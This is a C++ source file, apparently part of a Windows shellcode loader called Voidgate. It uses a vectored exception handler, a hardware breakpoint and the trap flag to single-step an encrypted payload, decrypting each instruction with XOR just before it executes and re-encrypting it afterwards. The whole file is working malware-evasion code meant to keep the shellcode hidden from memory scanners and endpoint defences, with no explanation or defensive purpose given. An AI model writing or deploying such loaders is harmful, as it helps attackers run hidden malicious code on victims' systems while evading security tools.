#include "Voidgate.h"
#include "payload.h"


DWORD64 payload_base        = 0;    //Global var holding the base address of the payload (entrypoint).
DWORD64 payload_lower_bound = 0;    //Global var holding the LOWER BOUND of the payload (used to determine if the exception occurs in our payload).
DWORD64 payload_upper_bound = 0;    //Global var holding the UPPER BOUND of the payload (used to determine if the exception occurs in our payload).
DWORD64 last_decrypted_asm  = 0;    //Global var holding the address of the last decrypted ASM instruction. This is used to encrypt back the instruction at the next iteration.

LONG VehDecryptHeapAsm(EXCEPTION_POINTERS* ExceptionInfo) 
{
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
    {
        //If hardware breakpoint Dr0 is set, clear it
        if (ExceptionInfo->ContextRecord->Dr0)
        {
            ExceptionInfo->ContextRecord->Dr0 = 0;
        }

        //Set TRAP flag to generate next EXCEPTION_SINGLE_STEP
        ExceptionInfo->ContextRecord->EFlags |= (1 << 8);

        //If shellcode is not in our bound, continue without encryption/decryption (example: if our shellcode executes a function in kernel32.dll)
        if (ExceptionInfo->ContextRecord->Rip < payload_lower_bound || ExceptionInfo->ContextRecord->Rip > payload_upper_bound)
        {
            return EXCEPTION_CONTINUE_EXECUTION;
        }

        DWORD64 current_asm_addr = ExceptionInfo->ContextRecord->Rip;

        //If there was a previous decrypted ASM instruction,encrypt it back
        if (last_decrypted_asm)
        {
            DWORD key_index = GetXorKeyIndexForAsm(payload_base, last_decrypted_asm, key);

            PBYTE addr_last_decrypted_asm = (PBYTE)last_decrypted_asm;
            for (INT i = 0; i < MAX_X64_ASM_OPCODE_LEN; i++)
            {
                if (key_index == key.size())
                {
                    key_index = 0;
                }
                addr_last_decrypted_asm[i] = addr_last_decrypted_asm[i] ^ key[key_index];
                key_index++;
            }
        }

        //Decrypt the current ASM instruction to prepare it for execution
        PBYTE current_asm = (PBYTE)current_asm_addr;
        DWORD keyIndex = GetXorKeyIndexForAsm(payload_base, current_asm_addr, key);
        for (INT i = 0; i < MAX_X64_ASM_OPCODE_LEN; i++)
        {
            if (keyIndex == key.size())
            {
                keyIndex = 0;
            }
            current_asm[i] = current_asm[i] ^ key[keyIndex];
            keyIndex++;
        }

        //Save the last decrypted ASM address to encrypt it at the next iteration
        last_decrypted_asm = current_asm_addr;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    else
    {
        return EXCEPTION_CONTINUE_SEARCH;
    }

}

BOOL SetHardwareBreakpoint(PVOID address_of_breakpoint) 
{

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE currentThread = GetCurrentThread();
    DWORD status = GetThreadContext(currentThread, &ctx);

    ctx.Dr0 = (UINT64)address_of_breakpoint;
    ctx.Dr7 |= (1 << 0);    //GLOBAL BREAKPOINT
    ctx.Dr7 &= ~(1 << 16);
    ctx.Dr7 &= ~(1 << 17);
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!SetThreadContext(currentThread, &ctx)) {
        return false;
    }

    return true;
}

DWORD GetXorKeyIndexForAsm(DWORD64 shellcode_base, DWORD64 current_asm_addr, std::string key)
{
    DWORD keySize = key.size();
    DWORD64 difference = current_asm_addr - shellcode_base;
    DWORD characterOffset = difference % (keySize);
    return characterOffset;
}

void LogWinapiError(std::string failedFunction)
{
    std::cout << "[X] ERROR - " << failedFunction << " failed with error code: " << GetLastError() << std::endl;
}
